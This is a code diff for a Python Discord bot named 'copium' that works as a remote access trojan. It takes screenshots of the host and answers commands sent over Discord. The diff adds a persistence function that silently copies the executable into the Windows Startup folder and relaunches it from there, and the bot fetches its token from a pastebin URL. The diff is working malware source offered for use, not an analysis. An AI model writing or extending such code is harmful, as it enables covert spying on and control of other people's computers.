@@ -10,18 +10,31 @@ import sys
 import os
 import re
 
-
-if getattr(sys, 'frozen', False):  # if built with pyinstaller
+if getattr(sys, 'frozen', False):
     file_path = os.path.abspath(sys.executable)
     silent = 0x08000000
+    exe = True
 else:
     file_path = os.path.abspath(__file__)
     silent = 0
+    exe = False
 
-copium_ver = 1.2
+file_name = file_path.split("\\")[-1]
+copium_ver = 1.22
 whoami = subprocess.run("whoami", shell=True, capture_output=True, encoding='cp858', creationflags=silent).stdout.rstrip()
 client = commands.Bot(command_prefix='!', intents=discord.Intents.all(), help_command=None)
 current_login = None
+
+
+def persistence():
+    startup_folder_path = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
+    if file_name not in os.listdir(startup_folder_path):
+        subprocess.run(f"copy \"{file_path}\" \"{startup_folder_path}\"", shell=True, creationflags=silent)
+        subprocess.run(f"call \"{os.path.join(startup_folder_path, file_name)}\"", shell=True, creationflags=silent)
+        if exe:
+            sys.exit()
+        else:
+            quit()
 
 
 def log_command(ctx, args=None, error=False):
@@ -109,6 +122,14 @@ async def login_command(ctx, host):
     print(log_command(ctx, host))
 
 
+@client.hybrid_command(name="version", with_app_command=True, description="tells the version running on the host")
+async def version_command(ctx):
+    if current_login != whoami:
+        return
+    await ctx.reply(f"Version {copium_ver}", ephemeral=True)
+    print(log_command(ctx))
+
+
 @client.hybrid_command(name="ss", with_app_command=True, description="takes a screenshot of the host")
 async def screenshot_command(ctx):
     if current_login != whoami:
@@ -169,5 +190,6 @@ async def site_command(ctx, site):
 
 
 if __name__ == '__main__':
+    persistence()
     TOKEN = requests.get("some pastebin raw url").content.decode()
     client.run(TOKEN, log_handler=None)
